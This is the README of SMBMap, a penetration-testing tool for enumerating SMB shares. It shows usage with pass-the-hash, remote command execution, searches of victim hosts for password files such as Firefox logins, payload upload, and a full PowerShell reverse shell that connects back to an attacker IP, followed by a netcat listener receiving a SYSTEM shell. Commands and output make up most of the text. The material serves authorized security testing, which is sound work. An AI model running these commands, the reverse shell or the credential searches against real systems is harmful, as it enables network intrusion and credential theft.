# SMBMap

SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.

Some of the features have not been thoroughly tested, so changes will be forth coming as bugs are found. I only really find and fix the bugs while I'm on engagements, so progress is a bit slow. Any feedback or bug reports would be appreciated. It's definitely rough around the edges, but I'm just trying to pack in features at the moment. Version 2.0 should clean up the code a lot….whenever that actually happens ;). Thanks for checking it out!! Planned features include --update (so you don't have to visit this page), actual logging, shadow copying ntds.dit automation (Win7 and up only..for now), other things….

You'll need Impacket to use this tool:

https://code.google.com/p/impacket/

## Features:
- Pass-the-hash Support
- File upload/download/delete
- Permission enumeration (writable share, meet Metasploit)
- Remote Command Execution
- Distrubted file content searching (new!)
- File name matching (with an auto downoad capability)

```
SMBMap - Samba Share Enumerator
Shawn Evans - Shawn.Evans@gmail.com

$ python smbmap.py -u jsmith -p password1 -d workgroup -h 192.168.0.1
$ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -h 172.16.0.20
$ cat smb_ip_list.txt | python smbmap.py -u jsmith -p password1 -d workgroup
$ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net group "Domain Admins" /domain'

-P      port (default 445), ex 139
-h      IP of host
-u      Username, if omitted null session assumed
-p      Password or NTLM hash
-s      Share to use for smbexec command output (default C$), ex 'C$'
-x      Execute a command, ex. 'ipconfig /r'
-d      Domain name (default WORKGROUP)
-R      Recursively list dirs, and files (no share\path lists ALL shares), ex. 'C$\Finance'
-A      Define a file name pattern (regex) that auto downloads a file on a match (requires -R or -r), not case sensitive, ex "(web|global).(asax|config)"
-r      List contents of directory, default is to list root of all shares, ex. -r 'c$\Documents and Settings\Administrator\Documents'
-F      File content search, -F '[Pp]assword' (requies admin access to execute commands, and powershell on victim host)
--search-path   Specify drive/path to search (used with -F, default C:\Users), ex 'D:\HR\'
-D      Download path, ex. 'C$\temp\passwords.txt'
-L      List all drives on a host
--upload-src    File upload source, ex '/temp/payload.exe'  (note that this requires --upload-dst for a destiation share)
--upload-dst    Upload destination on remote host, ex 'C$\temp\payload.exe'
--del       Delete a remote file, ex. 'C$\temp\msf.exe'
--skip      Skip delete file confirmation prompt
-q      Disable verbose output (basically only really useful with -A)
```

## Sample Default Output:
```
$ cat smb-hosts.txt | python smbmap.py -u jsmith -p 'R33nisP!nckl3' -d ABC
[+] Reading from stdin
[+] Finding open SMB ports....
[+] User SMB session establishd...
[+] IP: 192.168.0.5:445 Name: unkown                                            
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  READ, WRITE
        C$                                                      READ, WRITE
        IPC$                                                    NO ACCESS
        TMPSHARE                                                READ, WRITE
[+] User SMB session establishd...
[+] IP: 192.168.2.50:445        Name: unkown                                            
        Disk                                                    Permissions
        ----                                                    -----------
        IPC$                                                    NO ACCESS
        print$                                                  READ, WRITE
        My Dirs                                                 NO ACCESS
        WWWROOT_OLD                                             NO ACCESS
        ADMIN$                                                  READ, WRITE
        C$                                                      READ, WRITE

$ python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -h 192.168.2.50
[+] Finding open SMB ports....
[+] User SMB session establishd...
[+] IP: 192.168.2.50:445        Name: unkown                                            
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
abcadmin                  
The command completed successfully.
```
## File Content Searching:

```
$ python smbmap.py -h 192.168.1.203 -u Administrator -p p00p1234! -F password --search-path 'C:\Users\wingus\AppData\Roaming'
[!] Missing domain...defaulting to WORKGROUP
[+] Finding open SMB ports....
[+] User SMB session establishd...
[+] IP: 192.168.1.203:445 Name: unkown                                            
[+] File search started on 1 hosts...this could take a while
[+] Job 861d4cd845124cad95d42175 started on 192.168.1.203, result will be stored at C:\Windows\TEMP\861d4cd845124cad95d42175.txt
[+] Grabbing search results, be patient, share drives tend to be big...
[+] Job 1 of 1 completed
[+] All jobs complete
Host: 192.168.1.203       Pattern: password
C:\Users\wingus\AppData\Roaming\Mozilla\Firefox\Profiles\35msadwm.default\logins.json
C:\Users\wingus\AppData\Roaming\Mozilla\Firefox\Profiles\35msadwm.default\prefs.js
```

## Drive Listing
This feature was added to compliment the file content searching feature

```
$ python smbmap.py -h 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L 
[!] Missing domain...defaulting to WORKGROUP
[+] Finding open SMB ports....
[+] User SMB session establishd...
[+] IP: 192.168.1.24:445 Name: unkown                                            
[+] Host 192.168.1.24 Local Drives: C:\ D:\
[+] Host 192.168.1.24 Net Drive(s):
    E:      \\vboxsrv\Public      VirtualBox Shared Folders
```

## Nifty Shell:
Run Powershell Script on Victim SMB host (change the IP in the code to your IP addres, i.e where the shell connects back to)
```
$ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -h 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
[+] Finding open SMB ports....
[+] User SMB session establishd...
[+] IP: 192.168.2.50:445        Name: unkown                                            
[!] Error encountered, sharing violation, unable to retrieve output
```

## Attackers Netcat Listener

```
$ nc -l 4445
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
 nt authority\system
```
